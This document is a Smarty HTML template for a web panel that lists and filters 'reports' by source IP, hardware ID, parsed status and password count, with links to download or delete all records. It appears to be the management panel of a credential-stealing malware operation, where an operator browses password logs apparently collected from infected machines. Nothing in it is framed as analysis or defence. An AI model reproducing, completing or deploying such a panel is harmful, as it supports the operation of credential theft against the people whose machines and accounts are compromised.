{if {$smarty.request.routine|default:''} == 'confirm_clear_reports'}
{assign var='msg' value="Are you sure you want to delete all records?"}
{assign var='yes_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=reports&amp;routine=clear_reports"}
{assign var='no_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=reports"}
{include file='confirm.tpl'}
{/if}		
	{if $smarty.request.filter_string|default:'' != '' || $smarty.request.filter_ip|default:'' != '' || $smarty.request.filter_hwid|default:'' != '' || $smarty.request.filter_nonparsed|default:'' != '' || $smarty.request.filter_has_passwords|default:'' != ''}
		<h4>Attention! Filter activated. <a href="{$smarty.server.SCRIPT_NAME}?action=reports">Cancel</a>.</h4><br />
	{/if}

	{if $priv_can_delete}
		<a class="download_nav" href="{$smarty.server.SCRIPT_NAME}?action=ftp&amp;routine=download_reports">Download all records</a> (<b>{$total_reports_count}</b> {$total_reports_count|items}, {$total_report_table_size|file_size})<br />
		<a class="download_nav" href="{$smarty.server.SCRIPT_NAME}?action=ftp&amp;routine=download_nonparsed_reports">Download nonparsed reports</a> ({$total_nonparsed_reports} {$total_nonparsed_reports|items}, {$total_nonparsed_report_size|file_size})<br />
		<a class="delete_nav" href="{$smarty.server.SCRIPT_NAME}?action=reports&amp;routine=confirm_clear_reports">Delete all records</a> ({$total_report_table_size|file_size})<br />
	{/if}
	<a class="filter_nav" href="#" onclick="javascript:$('#filter_reports').slideToggle();">Show filter</a><br />
	<br />

	<div id="filter_reports" style="display:none;width:400px">

		<div id="tabs">
			<ul>
				<li><a href="#tabs-1">Filter</a></li>
			</ul>
			<div id="tabs-1">

				<br />

				<form id="filter_frm" name="filter_frm" action="">
					<input type="submit" style="position:absolute;left:-10000px;top:-10000px;" />
					<input type="hidden" name="action" value="reports" />
					<div style="padding-left: 10px; width: 130px; display:inline; float: left;">Search by IP: </div><div style="float:left;"><input style="width:200px;" name="filter_ip" value="{$smarty.request.filter_ip|default:''}" /></div>
					<div style="clear:both"></div>
					<div style="display:block;height:5px;"></div>
					<div style="padding-left: 10px; width: 130px; display:inline; float: left;">{if $enable_http_mode && ($show_http_to_users || $priv_is_admin)}Search logs:{else}Search logs: {/if}</div><div><input style="width:200px;" name="filter_string" value="{$smarty.request.filter_string|default:''}" /></div>
					<div style="clear:both"></div>
					<div style="display:block;height:5px;"></div>
					{if $smarty.request.filter_hwid|default:'' != ''}
						<input type="hidden" name="filter_hwid" value="{$smarty.request.filter_hwid|default:''}" />
					{/if}
					<input style="margin-left:10px;" type="radio" onclick="javascript:document.filter_frm.filter_has_passwords.checked=false" id="filter_nonparsed" name="filter_nonparsed" value="1"
					{if $smarty.request.filter_nonparsed|default:'' == '1'}
						checked="checked"
					{/if}
					/><label for="filter_nonparsed"> Show only nonparsed</label><br />
					<input style="margin-left:10px;" type="radio" onclick="javascript:document.filter_frm.filter_nonparsed.checked=false" id="filter_has_passwords" name="filter_has_passwords" value="1"
					{if $smarty.request.filter_has_passwords|default:'' == '1'}
						checked="checked"
					{/if}
					/><label for="filter_has_passwords"> Records has no passwords</label>
					<br /><br />

					<div class="buttons">
						<button class="neutral" onclick="javascript:clear_form('#filter_frm'); return false;" style="width:110px;">
							<img src="includes/design/images/reset_icon.png" alt="" />
							Reset
						</button>
						<button class="positive" onclick="javascript:document.filter_frm.submit();" style="width:130px;">
							<img src="includes/design/images/find_icon.png" alt="" />
							Activate
						</button>
					</div>
				</form>
				<br /><br />
			</div>
		</div>

		<br />
	</div>

	{if count($report_list)}
		<table id="table_reports" width="750px" cellspacing="0" summary="Log contents">
			<tr>
			<th width="15%">Report</th>
			<th width="20%">IP</th>
			<th width="25%">Time added</th>
			<th width="10%">Processed</th>
			<th width="15%">Size</th>
			<th width="15%">Passwords</th>
			</tr>

			{foreach from=$report_list item=report_item}
				<tr>
				{if $report_item.report_id == ''}
					<td></td>
				{else}
					{if $report_item.report_id == '0'}
						<td>$report_item.report_id<a class="view_report_delete"
					{else}
						<td><a class="view_report"
					{/if}
					 href="{$smarty.server.SCRIPT_NAME}?action=reports&amp;routine=view_report&amp;report_id={$report_item.report_id}">Open</a></td>
				{/if}

				<td>
				<a href="{$smarty.server.SCRIPT_NAME}?action=reports&amp;filter_ip={$report_item.report_source_ip}&amp;filter_has_passwords=1"><font size="-2">{$report_item.report_source_ip}</font></a>
				</td>
				<td>{$report_item.import_time}</td>
				<td>{$report_item.parsed|yes_no}</td>
				<td>{$report_item.report_len|file_size}</td>
				<td>{$report_item.count}</td>
				</tr>
			{/foreach}

		</table><br />

		{if $paginate.page_total gt 1}
			<div id="page_select">
				{paginate_prev} {paginate_middle link_prefix=" " link_suffix=" |" format="page" prefix="" suffix=""} {paginate_next}
			</div>
		{/if}
	{/if}